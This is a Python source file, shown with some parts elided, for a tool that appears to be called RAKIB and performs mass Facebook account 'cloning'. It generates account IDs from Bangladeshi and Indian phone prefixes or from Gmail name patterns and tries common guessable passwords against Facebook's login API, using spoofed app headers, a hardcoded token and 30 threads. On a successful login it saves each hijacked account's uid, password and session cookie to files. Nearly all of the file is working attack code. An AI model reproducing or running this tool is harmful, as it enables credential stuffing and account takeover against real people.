...
cps=[]
loop=0
#________________RANDOM UA_______________#
...
#__________________FILE UA________________________#
...
{G1}[{R}={G1}]{G1} TOOLS    {A}✦{G1} FILE{A}✦︎︎︎{G1}RANDOM
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#━━━━━━━━[ APPROVAL OF ]━━━━━━━━#
...
def Main_rakib():
        clear()
        print(f"{G1}[{A}1{G1}]{G1} START FILE CLONING")
        print(f"{G1}[{A}2{G1}]{G1} START RANDOM CLONING")
        print(f"{G1}[{A}0{G1}]{G1} EXIT TOOL'S")
        linex()
        opt1 = input(f"{R}[{G1}?{R}]{G1} Selection {R}:{G1} ")
        if opt1 == "1": file()   
        elif opt1 == "2":
            clear();print(f'{G1}[{A}1{G1}]{G1} START BD CLONING');print(f'{G1}[{A}2{G1}]{G1} START IND CLONING');print(f'{G1}[{A}3{G1}]{G1} START GMAIL CLONING');linex()
            opt = input(f"{R}[{G1}?{R}]{G1} Selection {R}:{G1} ")
            if opt == '1': bd()
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}[{G1}✦{R}]{G1} Selected Wrong Option ');time.sleep(2);Main_rakib()
            if d == '0':Main_rakib()
            else:linex();print(f'{R}[{G1}✦{R}]{G1}  Selected Wrong Option ');time.sleep(2);Main_rakib()
 
        elif opt1 == "0":linex();print(f'{R}[{G1}✦{R}]{G1} Exit Done Brother ');exit()
        else:linex();print(f'{R}[{G1}✦{R}]{G1} Selected Wrong Option ');time.sleep(2);Main_rakib()
...
def file():
    clear();print(f"{R}[{G1}✦{R}]{G1} Example {R}:{R} /{G1}sdcard{R}/{G1}rakib.txt {R}[{G1}ETC{R}]{G1}");linex()
    file = input(f"{R}[{G1}✦{R}]{G1} File Name {R}:{G1} ")
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        linex();print(f'{R}[{G1}✦{R}]{G1} File location not found ');time.sleep(2);file()
    clear();print(f'{R}[{G1}✦{R}]{G1} Method {R}[{G1}M1{R}]{G1} ');print(f'{R}[{G1}✦{R}]{G1} Method {R}[{G1}M2{R}]{G1} ');linex()
    methd=input(f"{R}[{G1}✦{R}]{G1} Selection {R}:{G1} ")
    plist=[]
    clear() 
    try:
        ps_limit = int(input((f"{R}[{G1}✦{R}]{G1} Enter Password Limit 2{R}:{G1} ")))
    except:
        ps_limit =1
    clear()
    print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} firstlast {R}|{G1} first@@ {R}[{G1}ETC{R}]{G1}');linex()
    for i in range(ps_limit):
        plist.append(input(f"{R}[{G1}✦{R}]{G1} Password No {R}[{G1}%s{R}]{G1} {R}:{G1} "%(i+1)))
    with tred(max_workers=30) as rakib:
        clear()
        tl = str(len(fo))
        
        print(f'{R}[{G1}✦{R}]{G1} Total File Id {R}:{A}',tl)
        print(f'{R}[{G1}✦{R}]{G1} If No Result {R}[{A}On{R}/{A}Off{R}]{G1} Airplane Mode ');linex()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd =='1':
                rakib.submit(api1,ids,names,passlist)
            elif methd =='2':
                rakib.submit(api2,ids,names,passlist)
            else:
                rakib.submit(api1,ids,names,passlist)
            
    print(f'\r{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f"{R}[{G1}✦{R}]{G1} Cloning Hasbeen Completed ")
    print(f'{R}[{G1}✦{R}]{G1} TOTAL OK ID {R}:{G1} '+str(len(oks)))
    print(f"{R}[{G1}✦{R}]{G1} Cloning Accounts Saved in /sdcard/rakib_M1_FILE_OK.txt")
    print(f'\r{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f"{R}[{G1}✦{R}]{G1} Press Enter To Go Back ")
    os.system('python Main_RAKIB.py')
 
##--------------BD_RANDOM------------##
def bd():
                user=[]
                clear()
                print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} 017 {R}|{G1} 019 {R}|{G1} 018 {R}|{G1} 016');linex()
                code = input(f"{R}[{G1}?{R}]{G1} Selection {R}:{G1} ")
                try:                    
                        clear();print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} 3000 {R}|{G1} 5000 {R}|{G1} 10000 {R}|{G1} 9999');linex()
                        limit = int(input(f'{R}[{G1}?{R}]{G1} Selection {R}:{G1} '))
                except ValueError:
                        limit = 5000
                ...
                with tred(max_workers=30) as rakib:     
                        clear()
                        tl = str(len(user))
                        print(f'{R}[{G1}✦{R}]{G1} Total Id {R}:{A}',tl)
                        print(f'{R}[{G1}✦{R}]{G1} Sim Code {R}:{A}',code)
                        print(f'{R}[{G1}✦{R}]{G1} If No Result {R}[{A}On{R}/{A}Off{R}]{G1} Airplane Mode ');linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'i love you','iloveyou','alamin','nabila','halima','jannat','ariyan','nadiya','trisha','@@@###','sanjida','sumaiya','bangladesh','fariya','113355','sarmin','mahadi','aaabbb']
                                rakib.submit(rd1,ids,passlist)
                print(f'\r{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f"{R}[{G1}✦{R}]{G1} Cloning Hasbeen Completed ")
                print(f'{R}[{G1}✦{R}]{G1} TOTAL OK ID {R}:{G1} '+str(len(oks)))
                print(f"{R}[{G1}✦{R}]{G1} Cloning Accounts Saved in /sdcard/rakib_M1_FILE_OK.txt")
...
def ind():
                user=[]
                clear()
                print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} +91639 {R}|{G1} +91620 {R}|{G1} +91720 {R}|{G1} +91789');linex()
                code = input(f"{R}[{G1}?{R}]{G1} Selection {R}:{G1} ")
                try:                    
                        clear();print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} 3000 {R}|{G1} 5000 {R}|{G1} 10000 {R}|{G1} 9999');linex()
                        limit = int(input(f'{R}[{G1}?{R}]{G1} Selection {R}:{G1} '))
...
def gmail():
                ...
                clear()
                print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} Rakib {R}|{G1} Sakib {R}|{G1} Ariyan {R}|{G1} Roman');linex()
                first = input(f'{R}[{G1}✦{R}]{G1} First Name {R}:{G1} ')
                clear()
                print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} khan {R}|{G1} Islam {R}|{G1} ali {R}|{G1} Ahmed');linex()
                last = input(f'{R}[{G1}✦{R}]{G1} Last Name {R}:{G1} ')
                clear()
                print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} @gmail.com {R}[{G1}ETC{R}]{G1}');linex()
                domain = input(f"{R}[{G1}?{R}]{G1} Selection {R}:{G1} ")
                clear()
                print(f'{R}[{G1}✦{R}]{G1} Example {R}:{G1} 3000 {R}|{G1} 5000 {R}|{G1} 10000 {R}|{G1} 9999');linex()
                try:
                        limit=int(input(f'{R}[{G1}?{R}]{G1} Selection {R}:{G1} '))
                ...
                with tred(max_workers=30) as rakib:
                        total = str(len(fo))
                        clear()
                        print(f'{R}[{G1}✦{R}]{G1} GMAIL-UID-CK{G1}')
                        print(f'{R}[{G1}✦{R}]{G1} Total Id {R}:{G1} '+total);print(f'{R}[{G1}✦{R}]{G1} Target Full Name {R}:{G1} '+first+last+domain);print(f'{R}[{G1}✦{R}]{G1} If No Result {R}[{A}On{R}/{A}Off{R}]{G1} Airplane Mode ');linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}[{G1}RAKIB{R}]{A}-{R}[{G1}%s{R}]{A}-{R}[{G1}OK{R}]{A}-{R}[{G1}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                head = {'User-Agent':'[FBAN/FB4A;FBAV/8643.0.0.88.126;FBBV/63582484033;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/Greenberry 71606Y;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.4,width=2874,height=2938};FB_FW/1;]',
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                            print(f'\r{R}[{G1}RAKIB-OK💚{R}]{G1} '+uid+f' {R}𒊹︎︎︎{G1} '+pas)
                        
                        print(f"\r{R}[{G1}COOKIE⚽{R}]{A}->{A} {cookie}")
                        ...
                        print(f'\r{R}[{Y}RAKIB-CP{R}]{Y} '+uid+f' {R}𒊹︎︎︎{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'RAKIB-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}[{G1}RAKIB-M1{R}]{A}-{R}[{G1}%s{R}]{A}-{R}[{G1}OK{R}]{A}-{R}[{G1}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head = {'User-Agent':'[FBAN/FB4A;FBAV/352.0.0.20.117;FBBV/310414731;FBDM/{density=3.5,width=1200,height=1024};FBLC/en_US;FBRV/237981618;FB_FW/2;FBCR/Magenta;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo S5;FBSV/9.9.3;FBOP/1;FBCA/arm64-v8a:;]',
            'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            ...
            if 'session_key' in po:
                    ...
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}[{G1}RAKIB-OK💚{R}]{G1} '+uid+f' {R}𒊹︎︎︎{G1} '+pas)
                    print(f"\r{R}[{G1}COOKIE{R}]{A}->{G1} {cookie}")
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}[{G1}RAKIB-M2{R}]{A}-{R}[{G1}%s{R}]{A}-{R}[{G1}OK{R}]{A}-{R}[{G1}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}[{G1}RAKIB-OK💚{R}] '+uid+f' {R}𒊹︎︎︎{G1} '+pas)
                    print(f"\r{R}[{G1}COOKIE{R}]{A}->{A} {cookie}")
                    file_path = os.path.join(folder_path, 'RAKIB-FILE-M2-OK.txt')
                    open('/sdcard/RAKIB/RAKIB-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}RAKIB-CP{R}]{Y} '+uid+f' {R}𒊹︎︎︎{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'RAKIB-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
